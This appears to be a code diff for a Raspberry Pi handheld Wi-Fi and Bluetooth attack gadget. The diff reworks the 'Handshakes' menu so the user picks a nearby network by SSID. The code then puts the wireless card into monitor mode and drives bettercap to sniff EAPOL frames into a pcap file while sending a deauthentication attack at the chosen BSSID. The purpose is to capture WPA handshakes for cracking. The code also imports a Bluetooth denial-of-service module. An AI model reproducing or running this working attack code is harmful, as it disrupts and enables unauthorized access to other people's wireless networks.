@@ -2,8 +2,7 @@ import RPi.GPIO as GPIO
 import time
 import os
 import subprocess
-import socket
-import sys
+import json
 import threading
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives import padding
@@ -11,20 +10,12 @@ from cryptography.hazmat.backends import default_backend
 from lib import dos_bluetooth
 from lib.dos_bluetooth import dos
 import functools
+from lib import wifinetworks
+from lib.wifinetworks import wifi_info
 from lib.mojstd import *
 
 scroll_offset = 0
 max_visible_options = 7
-#Bettercap
-commands = [
-    'wifi.recon on',
-    'wifi.show',
-    'set net.sniff.verbose true',
-    'set net.sniff.filter ether proto 0x888e',
-    'set net.sniff.output wpa.pcap',
-    'net.sniff on',
-    'wifi.deauth 2c:98:11:93:eb:f3'
-]
 
 #@functools.lru_cache(maxsize=236)
 def draw_menu(selected_index):
@@ -99,7 +90,6 @@ while True:
             while True:
                 draw_menu(selected_index)
 
-
                 if GPIO.input(KEY_UP_PIN) == 0:
                     selected_index = (selected_index - 1) % len(menu_options)
                     draw_menu(selected_index)
@@ -123,7 +113,6 @@ while True:
                         while True:
                             draw_menu(selected_index)
 
-
                             if GPIO.input(KEY_UP_PIN) == 0:
                                 selected_index = (selected_index - 1) % len(menu_options)
                                 draw_menu(selected_index)
@@ -138,55 +127,102 @@ while True:
                                 selected_option = menu_options[selected_index]
 
                                 if selected_option == "Handshakes":
-                                    #menu_options = ["Pwnagotchi", "Wifiphisher"]
-                                    #selected_index = 0
-                                    show_message("TEST")
-                                    #os.system("sudo airmon-ng moncheck kill")
-                                    #time.sleep(1)
-                                    os.system("sudo iw wlan0 interface add mon0 type monitor")
-                                    os.system("sudo airmon-ng start mon0")
-                                    os.system("sudo airmon-ng check mon0 && sudo airmon-ng check kill")
                                     
-                                    #os.system("sudo iwconfig wlan0 mode monitor")
+                                        wifi_info().main()
+                                        menu_options = []
+                                        selected_index = 0
 
-                                    time.sleep(2)
-                                    bettercap_process = subprocess.Popen(
-                                        ['sudo', 'bettercap', '-iface', 'mon0'],
-                                        stdin=subprocess.PIPE,
-                                        stdout=subprocess.PIPE,
-                                        stderr=subprocess.PIPE,
-                                        text=True,
-                                        bufsize=1 #sono piccole memorie in cui vengono storati le cose temporaneamente, i byte vengono letti a blocchi è  più veloce
-                                    )
+                                        with open("wifiinfo.json", mode="r") as a: 
+                                            data = json.load(a)
 
-                                    time.sleep(0.5)
-                                    for i in commands:
-                                        time.sleep(1.5)
-                                        bettercap_process.stdin.write(i+'\n')
-                                        bettercap_process.stdin.flush()
-                                        show_message(bettercap_process.stdout.readline(),2)
-                                        #
-                                        with open("output.txt", 'a') as file:
-                                            file.write(bettercap_process.stdout.readline())
+                                        dictdionary = {}
 
-                                        #show_message(i, 1)
-
-                                    try:
+                                        for item in data:
+                                            menu_options.append(item['ssid'])                
+                                            dictdionary[item['ssid']] = item['bssid']
+                                        
                                         while True:
-                                            output = bettercap_process.stdout.readline()
-                                            #if output == '' and bettercap_process.poll() is not None:
-                                             #   break
-                                            if output:
-                                                print(output.strip())
-                                    except KeyboardInterrupt:
-                                        # Terminate the Bettercap process if needed
-                                        bettercap_process.terminate()
-                                        bettercap_process.wait()  # Wait for the process to terminate
+                                            draw_menu(selected_index)
+                                            if GPIO.input(KEY_UP_PIN) == 0:
+                                                selected_index = (selected_index - 1) % len(menu_options)
+                                                draw_menu(selected_index)
+                                                time.sleep(0.3)
 
+                                            elif GPIO.input(KEY_DOWN_PIN) == 0:
+                                                selected_index = (selected_index + 1) % len(menu_options)
+                                                draw_menu(selected_index)
+                                                time.sleep(0.3)
 
+                                            elif GPIO.input(KEY_PRESS_PIN) == 0:
+                                                selected_option = menu_options[selected_index]
+                                                selected_bssid = dictdionary[selected_option]
+                                                print(selected_bssid)
+                                                #Bettercap
+                                                commands = [
+                                                    'wifi.recon on',
+                                                    'wifi.show',
+                                                    'set wifi.recon channel 8',
+                                                    'set net.sniff.verbose true',
+                                                    'set net.sniff.filter ether proto 0x888e',
+                                                    'set net.sniff.output wpa.pcap',
+                                                    'net.sniff on',
+                                                    f'wifi.deauth {selected_bssid}'
+                                                ]
 
+                                                show_message("Wait please...")
+                                                #os.system("sudo airmon-ng moncheck kill")
+                                                #time.sleep(1)
+                                                os.system("sudo iw wlan0 interface add mon0 type monitor")
+                                                os.system("sudo airmon-ng start mon0")
+                                                os.system("sudo airmon-ng check mon0 && sudo airmon-ng check kill")
 
+                                                #os.system("sudo iwconfig wlan0 mode monitor")
 
+                                                time.sleep(2)
+                                                bettercap_process = subprocess.Popen(
+                                                    ['sudo', 'bettercap', '-iface', 'mon0'],
+                                                    stdin=subprocess.PIPE,
+                                                    stdout=subprocess.PIPE,
+                                                    stderr=subprocess.PIPE,
+                                                    text=True,
+                                                    bufsize=1 #sono piccole memorie in cui vengono storati le cose temporaneamente, i byte vengono letti a blocchi è  più veloce
+                                                )
+
+                                                if os.path.exists("wpa.pcap") == True:
+                                                        print(commands[5])
+                                                        commands[5] = f'set net.sniff.output wpa({selected_bssid}).pcap'
+
+                                                time.sleep(0.5)
+                                                for i in commands:
+                                                    show_message("Loading ...")
+                                                    time.sleep(2)
+                                                    bettercap_process.stdin.write(i+'\n')
+                                                    bettercap_process.stdin.flush()
+                                                    show_message(bettercap_process.stdout.readline(),2)
+                                                    #
+                                                    with open("output.txt", 'a') as file:
+                                                        file.write(bettercap_process.stdout.readline())
+                                                    
+
+                                                    #show_message(i, 1)
+
+                                                try:
+                                                    while True:
+                                                        output = bettercap_process.stdout.readline()
+                                                        #if output == '' and bettercap_process.poll() is not None:
+                                                        #   break
+                                                        if output:
+                                                            print(output.strip())
+                                                except KeyboardInterrupt:
+                                                    # Terminate the Bettercap process if needed
+                                                    bettercap_process.terminate()
+                                                    bettercap_process.wait()  # Wait for the process to terminate
+
+                                                if os.path.exists(f"wpa({selected_bssid}).pcap") == True:
+                                                    show_message("Handshake captured!",1)
+                                                    show_message("retring...")
+                                                    break
+                                            #break
 
         elif selected_option == "Bluetooth":
             # Draw and handle the Network sub-menu
